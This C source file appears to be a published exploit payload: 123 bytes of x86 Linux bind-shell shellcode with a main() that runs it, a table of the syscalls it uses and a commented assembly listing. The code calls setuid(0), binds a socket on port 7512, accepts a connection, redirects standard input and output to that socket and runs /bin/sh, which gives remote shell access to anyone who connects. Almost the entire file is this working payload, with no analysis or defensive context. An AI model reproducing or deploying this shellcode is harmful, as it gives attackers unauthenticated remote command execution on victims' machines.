/*
***********************************************************
* Author: posidron (www.tripbit.org)
*
* Description: Linux bindshell for x86 arch. 
*        Size: 123 bytes
***********************************************************
*/


char bindshell[]= "\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50\x6a\x01\x6a"
		              "\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x31\xd2\x52"
		              "\x66\x68\x1d\x58\x66\x6a\x02\x89\xe2\x31\xc9\x6a"
		              "\x10\x52\x50\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x6a"
		              "\x02\x6a\x03\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31"
		              "\xc9\x51\x51\x6a\x03\x89\xe1\xfe\xc3\xb0\x66\xcd"
		              "\x80\x31\xc9\x89\xc3\xb0\x3f\xcd\x80\xfe\xc1\xb0"
		              "\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\x31\xc0\x50"
		              "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
		              "\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xdb"
		              "\xb0\x01\xcd\x80";

int main(int argc, char **argv)
{
	void(*tsr) (void);
        tsr = (void*)bindshell;
        tsr();
	return 0;
}


/*
%eax 	Name			%ebx			%ecx            
1	sys_exit		int			-
11	sys_execve		struct pt_regs		-
23	sys_setuid		uid_t			-
63	sys_dup2		unsigned int		unsigned int
102	sys_socketcall		int			unsigned long*

- sys_socketcall_socket	= 1
- sys_socketcall_bind	= 2
- sys_socketcall_listen	= 4
- sys_socketcall_accept	= 5
*/


/*
main()
{
	__asm__("
		xor %ebx, %ebx
		movb $0x17, %al
		int $0x80

		xor %eax, %eax
		push %eax
		push $0x1
		push $0x2
		mov %esp,%ecx
		incb %bl
		movb $0x66,%al
		int $0x80

		xor %edx, %edx
		push %edx
		pushw $0x581d
		pushw %0x2
		mov %esp, %edx
		xor %ecx, %ecx
		push $0x10
		push %edx
		push %eax
		mov %esp, %ecx
		incb %bl
		mov $0x66, %al
		int $0x80

		push $0x2
		push $0x3
		mov %esp, %ecx
		movb $0x4, %bl
		movb $0x66, %al
		int $0x80

		xor %ecx, %ecx
		push %ecx
		push %ecx
		push $0x3
		mov %esp, %ecx
		incb %bl
		movb $0x66, %al
		int $0x80

		mov %ecx, %ecx
		mov %eax, %ebx
		movb $0x3f, %al
		int $0x80
		incb %cl
		mov $0x3f, %al
		int $0x80
		incb %cl
		movb $0x3f, %al
		int $0x80

		xor %eax, %eax
		push %eax
		push $0x68732f2f
		push $0x6e69622f
		mov %esp, %ebx
		push %eax 
		push %ebx
		mov %esp, %ecx
		xor %edx, %edx
		movb $0xb, %al
		int $0x80
		
		xor %ebx, %ebx
		movb $0x1, %al
		int $0x80
	");
}
*/